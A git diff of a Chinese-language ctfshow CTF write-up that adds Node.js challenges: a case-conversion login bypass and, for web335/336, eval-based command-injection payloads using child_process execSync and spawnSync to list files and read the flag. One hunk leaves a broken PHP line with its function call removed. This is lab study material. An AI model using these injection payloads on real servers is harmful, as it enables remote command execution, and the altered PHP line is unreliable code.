@@ -4079,7 +4079,7 @@ for ($i=36; $i < 0x36d; $i++) {
     array_push($allow, rand(1,$i));
 }
 if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
-    file_put_contents($_GET['n'], $_POST['content']);
+    ($_GET['n'], $_POST['content']);
 }
 
 ?>
@@ -4213,7 +4213,7 @@ payload:
 
 这道题的flag少了一位，在得到的flag在替换掉0x2d后，再进行爆破即可得到flag
 
-pay
+payload:
 
 ```python
 a = "fa2a169a0x2da0820x2d40f30x2da5cd0x2d65ce0d29b42"
@@ -4725,7 +4725,155 @@ $vip->getFlag();
 
 根据题目提示存在flag.php页面且只允许
 
+### node.js
 
+#### web334
+
+login.js
+
+```javascript
+var express = require('express');
+var router = express.Router();
+var users = require('../modules/user').items;
+ 
+var findUser = function(name, password){
+  return users.find(function(item){
+    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
+  });
+};
+
+/* GET home page. */
+router.post('/', function(req, res, next) {
+  res.type('html');
+  var flag='flag_here';
+  var sess = req.session;
+  var user = findUser(req.body.username, req.body.password);
+ 
+  if(user){
+    req.session.regenerate(function(err) {
+      if(err){
+        return res.json({ret_code: 2, ret_msg: '登录失败'});        
+      }
+       
+      req.session.loginUser = user.username;
+      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
+    });
+  }else{
+    res.json({ret_code: 1, ret_msg: '账号或密码错误'});
+  }  
+  
+});
+
+module.exports = router;
+
+```
+
+user.js
+
+```javascript
+module.exports = {
+  items: [
+    {username: 'CTFSHOW', password: '123456'}
+  ]
+};
+```
+
+审计一下代码看到已经给出了明文的账号密码
+
+但是要注意这里
+
+```
+return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
+```
+
+这里要去输入的账号不能为CTFSHOW，且输入的用户名转换为大写后与明文账号相同即可
+
+那就很简单了，输入小写的ctfshow和密码123456即可得到flag
+
+![image-20241213215625920](assets/image-20241213215625920.png)
+
+#### web335
+
+![image-20241213215731651](assets/image-20241213215731651.png)
+
+查看源代码得到hint
+
+![image-20241213215755455](assets/image-20241213215755455.png)
+
+看到eval猜测是命令执行，js中的eval函数的利用与php中的有所不同
+
+Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。
+
+payload:
+
+```
+/?eval=require('child_process').execSync('ls').toString()
+/?eval=require('child_process').execSync('cat fl00g.txt').toString()
+
+require('child_process').spawnSync('ls',['./']).stdout.toString()
+require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString()
+
+global.process.mainModule.constructor._load('child_process').execSync('ls',['.']).toString()
+```
+
+
+
+那为什么下面的方法会回显[object object]呢？
+
+```
+require('child_process').exec('calc'); //这题不知道为什么exec用不了
+```
+
+> 当你在 Web 界面通过某种命令注入手段调用 Node.js的 child_process 时，如果希望直接在页面上看到命令输出结果，execsync 会更直观。它会阻塞直到命令执行结束，并将结果返回给你的代码，你能直接以字符串形式处理和展示。而 exec则需要通过回调来拿结果，如果没写回调或没正确处理，就只会看到一个[object object]的返回。
+
+
+
+#### web336
+
+这题跟上一题差不多，但是貌似把execSync办了
+
+用其他方法即可
+
+```
+require('child_process').spawnSync('ls',['./']).stdout.toString()
+require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString()
+
+global.process.mainModule.constructor._load('child_process').execSync('ls',['.']).toString()
+```
+
+
+
+#### web337
+
+```js
+var express = require('express');
+var router = express.Router();
+var crypto = require('crypto');
+
+function md5(s) {
+  return crypto.createHash('md5')
+    .update(s)
+    .digest('hex');
+}
+
+/* GET home page. */
+router.get('/', function(req, res, next) {
+  res.type('html');
+  var flag='xxxxxxx';
+  var a = req.query.a;
+  var b = req.query.b;
+  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
+  	res.end(flag);
+  }else{
+  	res.render('index',{ msg: 'tql'});
+  }
+  
+});
+
+module.exports = router;
+```
+
+ 
 
 ### SSRF
 
